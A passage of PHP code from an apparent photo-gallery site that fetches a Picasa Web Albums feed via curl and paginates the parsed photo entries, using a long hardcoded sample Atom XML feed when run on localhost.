url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/logo_cn.gif' height='110' width='276' type='image/gif' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/s72/logo_cn.png' height='29' width='72'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/s144/logo_cn.png' height='58' width='144'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/s288/logo_cn.png' height='110' width='276'/><media:title type='plain'>logo_cn.gif</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462098051612756274</id><published>2010-04-20T06:10:05.000Z</published><updated>2010-04-20T06:10:05.294Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>promo_laiba.png</title><summary type='text'/><content type='image/png' src='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/promo_laiba.png'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462098051612756274'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5462098051612756274'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/BNzzGRzupe6RtPg1JYMuuQ'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462098051612756274'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5462098051612756274'/><gphoto:id>5462098051612756274</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>5.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>517</gphoto:width><gphoto:height>73</gphoto:height><gphoto:size>32641</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271743805000</gphoto:timestamp><gphoto:imageVersion>241</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>c4e46e5943b41acb00aa7d26cc6e0557</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/promo_laiba.png' height='73' width='517' type='image/png' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/s72/promo_laiba.png' height='11' width='72'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/s144/promo_laiba.png' height='21' width='144'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/s288/promo_laiba.png' height='41' width='288'/><media:title type='plain'>promo_laiba.png</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462099539391843298</id><published>2010-04-20T06:15:51.000Z</published><updated>2010-04-20T06:15:51.702Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>promo_laiba.png</title><summary type='text'/><content type='image/png' src='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/promo_laiba.png'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462099539391843298'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5462099539391843298'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/peWgQE517l9VJlp_7eCSuQ'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462099539391843298'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5462099539391843298'/><gphoto:id>5462099539391843298</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>6.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>517</gphoto:width><gphoto:height>73</gphoto:height><gphoto:size>32641</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271744151000</gphoto:timestamp><gphoto:imageVersion>242</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>c4e46e5943b41acb00aa7d26cc6e0557</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/promo_laiba.png' height='73' width='517' type='image/png' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/s72/promo_laiba.png' height='11' width='72'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/s144/promo_laiba.png' height='21' width='144'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/s288/promo_laiba.png' height='41' width='288'/><media:title type='plain'>promo_laiba.png</media:title></media:group></entry></feed>";
        }       
        else{   
                $ch = curl_init();
                $header[] = "Authorization: GoogleLogin auth=".trim($authdata);
                $header[] = "GData-Version: 2";                 
                $url = "http://picasaweb.google.com/data/feed/api/user/default/albumid/".trim($albumid)."?start-index=1&max-results=1000000";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
        $url = decodeuri(trim($albumid))."?start-index=1&max-results=1000000";
        //return $xmlstr;
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        $objList = $objXml->getElementsByTagName("entry");                      

        $photolist = array();
        $photolist['length'] = $objList->length;
        $photolist['username'] = iconv('utf-8','gb2312',$objXml->getElementsByTagName("feed")->item(0)->getElementsByTagName(arrmember(split("[:]",'gphoto:user'),"1"))->item(0)->nodeValue);
        
        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
        $totalitem = $objList->length;
        if (fmod($totalitem, $pagesize) == 0){
                $totalpage=$totalitem/$pagesize;
        }       
        else{
                $totalpage=ceil($totalitem/$pagesize);
        }       
        if ($totalpage == $page)
                $endid = $totalitem-1;
        elseif ($totalpage > $page)
                $endid = floor($strpagesize*($page)-1);
        elseif ($totalpage < $page){
                $endid = floor($strpagesize*($page-1)-1);
        }                       

        $photolist['albumname'] = iconv('utf-8','gb2312',$objXml->getElementsByTagName("feed")->item(0)->getElementsByTagName("title")->item(0)->nodeValue);

        for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                $objHdd = $objList->item($i);
                        $photolist[$i]['photoid'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(1)->nodeValue);
                        $photolist[$i]['photoname'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('title')->item(0)->nodeValue);
                        $photolist[$i]['photopublished'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('published')->item(0)->nodeValue);
                        $photolist[$i]['photoupdated'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('updated')->item(0)->nodeValue);
                        $photolist[$i]['photosummary'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('summary')->item(0)->nodeValue);
                        $photolist[$i]['photosize'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'gphoto:size'),"1"))->item(0)->nodeValue);
                        $photolist[$i]['photoaccess'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'gphoto:access'),"1"))->item(0)->nodeValue);
                        $photolist[$i]['photolocation'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'gphoto:location'),"1"))->item(0)->nodeValue);
                        $photolist[$i]['photocommentcount'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'gphoto:commentCount'),"1"))->item(0)->nodeValue);
                        $photolist[$i]['photolink'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('id')->item(0)->nodeValue);
        }
        return $photolist;
}

function googlephotoview($authclientLogin,$albumid,$page,$pagesize){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
		$xmlstr = "<?php xml version='1.0' encoding='UTF-8'?><feed xmlns='http://www.w3.org/2005/Atom' xmlns:exif='http://schemas.google.com/photos/exif/2007' xmlns:gphoto='http://schemas.google.com/photos/2007' xmlns:media='http://search.yahoo.com/mrss/' xmlns:openSearch='http://a9.com/-/spec/opensearchrss/1.0/' xmlns:gml='http://www.opengis.net/gml' xmlns:georss='http://www.georss.org/georss'><id>http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273</id><updated>2010-04-20T06:28:40.039Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>X3193</title><subtitle type='text'>X3193</subtitle><rights type='text'>public</rights><icon>http://lh6.ggpht.com/_dm6qv9_mhy8/S8lf9KEtgmE/AAAAAAAAAPI/zLOuk3gVFWE/s160-c/X3193.jpg</icon><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193'/><link rel='http://schemas.google.com/photos/2007#slideshow' type='application/x-shockwave-flash' href='http://picasaweb.google.com/s/c/bin/slideshow.swf?host=picasaweb.google.com&amp;RGB=0x000000&amp;feed=http%3A%2F%2Fpicasaweb.google.com%2Fdata%2Ffeed%2Fapi%2Fuser%2Fwanw.x3193.3322.org%2Falbumid%2F5461001527444210273%3Falt%3Drss'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273?start-index=1&amp;max-results=1000'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><generator version='1.00' uri='http://picasaweb.google.com/'>Picasaweb</generator><openSearch:totalResults>5</openSearch:totalResults><openSearch:startIndex>1</openSearch:startIndex><openSearch:itemsPerPage>1000</openSearch:itemsPerPage><gphoto:id>5461001527444210273</gphoto:id><gphoto:name>X3193</gphoto:name><gphoto:location>China</gphoto:location><gphoto:access>public</gphoto:access><gphoto:timestamp>1271488000</gphoto:timestamp><gphoto:numphotos>5</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><georss:where><gml:Envelope><gml:lowerCorner>18.080862 73.5351877</gml:lowerCorner><gml:upperCorner>53.6424579 134.8556062</gml:upperCorner></gml:Envelope><gml:Point><gml:pos>35.86166 104.195397</gml:pos></gml:Point></georss:where><gphoto:allowPrints>true</gphoto:allowPrints><gphoto:allowDownloads>true</gphoto:allowDownloads><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461356353765299666</id><published>2010-04-18T06:11:55.000Z</published><updated>2010-04-18T06:11:55.647Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>200732415592131379.jpg</title><summary type='text'/><content type='image/jpeg' src='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/200732415592131379.jpg'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461356353765299666'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461356353765299666'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/ET6IGxZSMgyyQO6EtqgqEA'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461356353765299666'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461356353765299666'/><gphoto:id>5461356353765299666</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>2.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>2560</gphoto:width><gphoto:height>1920</gphoto:height><gphoto:size>1079514</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271571115000</gphoto:timestamp><gphoto:imageVersion>228</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:fstop>5.6</exif:fstop><exif:make>OLYMPUS OPTICAL CO.,LTD</exif:make><exif:model>X-2,C-50Z       </exif:model><exif:exposure>0.004</exif:exposure><exif:flash>false</exif:flash><exif:focallength>18.83</exif:focallength><exif:iso>80</exif:iso><exif:imageUniqueID>91eae41caefa1b8168ff654be922b499</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/200732415592131379.jpg' height='1200' width='1600' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/s72/200732415592131379.jpg' height='54' width='72'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/s144/200732415592131379.jpg' height='108' width='144'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8qiqxIA1dI/AAAAAAAAAOQ/b9F-dC0PHio/s288/200732415592131379.jpg' height='216' width='288'/><media:title type='plain'>200732415592131379.jpg</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461368367913393618</id><published>2010-04-18T06:58:32.000Z</published><updated>2010-04-18T06:58:32.472Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>200732415592131379.jpg</title><summary type='text'/><content type='image/jpeg' src='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/200732415592131379.jpg'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461368367913393618'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461368367913393618'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/Md_xYvcNP3mcPLiMrfbL7w'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461368367913393618'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461368367913393618'/><gphoto:id>5461368367913393618</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>3.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>2560</gphoto:width><gphoto:height>1920</gphoto:height><gphoto:size>1079514</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271573912000</gphoto:timestamp><gphoto:imageVersion>230</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:fstop>5.6</exif:fstop><exif:make>OLYMPUS OPTICAL CO.,LTD</exif:make><exif:model>X-2,C-50Z       </exif:model><exif:exposure>0.004</exif:exposure><exif:flash>false</exif:flash><exif:focallength>18.83</exif:focallength><exif:iso>80</exif:iso><exif:imageUniqueID>91eae41caefa1b8168ff654be922b499</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/200732415592131379.jpg' height='1200' width='1600' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/s72/200732415592131379.jpg' height='54' width='72'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/s144/200732415592131379.jpg' height='108' width='144'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S8qtmFUIXdI/AAAAAAAAAOY/vLow0hwBqII/s288/200732415592131379.jpg' height='216' width='288'/><media:title type='plain'>200732415592131379.jpg</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461377717417411186</id><published>2010-04-18T07:34:49.000Z</published><updated>2010-04-18T07:34:49.375Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>logo_cn.gif</title><summary type='text'/><content type='image/gif' src='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/logo_cn.gif'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461377717417411186'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5461377717417411186'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/rIiepHjPBzA7v7rfPriS2w'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5461377717417411186'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5461377717417411186'/><gphoto:id>5461377717417411186</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>4.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>276</gphoto:width><gphoto:height>110</gphoto:height><gphoto:size>7763</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271576089000</gphoto:timestamp><gphoto:imageVersion>232</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>e633ed9c7f5a9250b4de235457d8778a</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/logo_cn.gif' height='110' width='276' type='image/gif' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/s72/logo_cn.png' height='29' width='72'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/s144/logo_cn.png' height='58' width='144'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8q2GS7mAnI/AAAAAAAAAOg/22_vMSiH0No/s288/logo_cn.png' height='110' width='276'/><media:title type='plain'>logo_cn.gif</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462098051612756274</id><published>2010-04-20T06:10:05.000Z</published><updated>2010-04-20T06:10:05.294Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>promo_laiba.png</title><summary type='text'/><content type='image/png' src='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/promo_laiba.png'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462098051612756274'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5462098051612756274'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/BNzzGRzupe6RtPg1JYMuuQ'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462098051612756274'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5462098051612756274'/><gphoto:id>5462098051612756274</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>5.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>517</gphoto:width><gphoto:height>73</gphoto:height><gphoto:size>32641</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271743805000</gphoto:timestamp><gphoto:imageVersion>241</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>c4e46e5943b41acb00aa7d26cc6e0557</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/promo_laiba.png' height='73' width='517' type='image/png' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/s72/promo_laiba.png' height='11' width='72'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/s144/promo_laiba.png' height='21' width='144'/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S81FPQ67STI/AAAAAAAAAPE/dJDo58XSd54/s288/promo_laiba.png' height='41' width='288'/><media:title type='plain'>promo_laiba.png</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462099539391843298</id><published>2010-04-20T06:15:51.000Z</published><updated>2010-04-20T06:15:51.702Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#photo'/><title type='text'>promo_laiba.png</title><summary type='text'/><content type='image/png' src='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/promo_laiba.png'/><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462099539391843298'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193#5462099539391843298'/><link rel='http://schemas.google.com/photos/2007#canonical' type='text/html' href='http://picasaweb.google.com/lh/photo/peWgQE517l9VJlp_7eCSuQ'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5461001527444210273/photoid/5462099539391843298'/><link rel='http://schemas.google.com/photos/2007#report' type='text/html' href='http://picasaweb.google.com/lh/reportAbuse?uname=wanw.x3193.3322.org&amp;aid=5461001527444210273&amp;iid=5462099539391843298'/><gphoto:id>5462099539391843298</gphoto:id><gphoto:version>1</gphoto:version><gphoto:position>6.0</gphoto:position><gphoto:albumid>5461001527444210273</gphoto:albumid><gphoto:access>public</gphoto:access><gphoto:width>517</gphoto:width><gphoto:height>73</gphoto:height><gphoto:size>32641</gphoto:size><gphoto:client/><gphoto:checksum/><gphoto:timestamp>1271744151000</gphoto:timestamp><gphoto:imageVersion>242</gphoto:imageVersion><gphoto:commentCount>0</gphoto:commentCount><gphoto:license id='0' name='All Rights Reserved' url=''>ALL_RIGHTS_RESERVED</gphoto:license><exif:tags><exif:imageUniqueID>c4e46e5943b41acb00aa7d26cc6e0557</exif:imageUniqueID></exif:tags><media:group><media:content url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/promo_laiba.png' height='73' width='517' type='image/png' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/s72/promo_laiba.png' height='11' width='72'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/s144/promo_laiba.png' height='21' width='144'/><media:thumbnail url='http://lh3.ggpht.com/_dm6qv9_mhy8/S81Gl3VGi-I/AAAAAAAAAPI/bs_lI7lUPVQ/s288/promo_laiba.png' height='41' width='288'/><media:title type='plain'>promo_laiba.png</media:title></media:group></entry></feed>";
        }       
        else{
                $ch = curl_init();
                $url = "http://picasaweb.google.com/data/feed/api/user/default/albumid/".trim($albumid)."?start-index=1&max-results=1000000";
                $ch = curl_init();
                $header[] = "Authorization: GoogleLogin auth=".trim($authclientLogin);
                $header[] = "GData-Version: 2";                 
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
        $url = decodeuri(trim($albumid))."?start-index=1&max-results=1000000";
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        $objList = $objXml->getElementsByTagName("entry");
        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
        $totalitem = $objList->length;
        if (fmod($totalitem, $pagesize) == 0){
                $totalpage=$totalitem/$pagesize;
        }       
        else{
                $totalpage=ceil($totalitem/$pagesize);
        }       
        if ($totalpage == $page)
                $endid = $totalitem-1;
        elseif ($totalpage > $page)
                $endid = floor($strpagesize*($page)-1);
        elseif ($totalpage < $page){
                $endid = floor($strpagesize*($page-1)-1);
        }       
        $photoname = "";                
        for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                $objHdd = $objList->item($i);
                if ($objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(1)->nodeValue == trim(request("photoid"))){
                        $photoname = $objHdd->getElementsByTagName("title")->item(0)->nodeValue;
                        break;
                } 
        }
        $photoview['photoname'] = $photoname;   
        $photoview['username'] = $objXml->getElementsByTagName("feed")->item(0)->getElementsByTagName(arrmember(split("[:]","gphoto:user"),"1"))->item(0)->nodeValue;
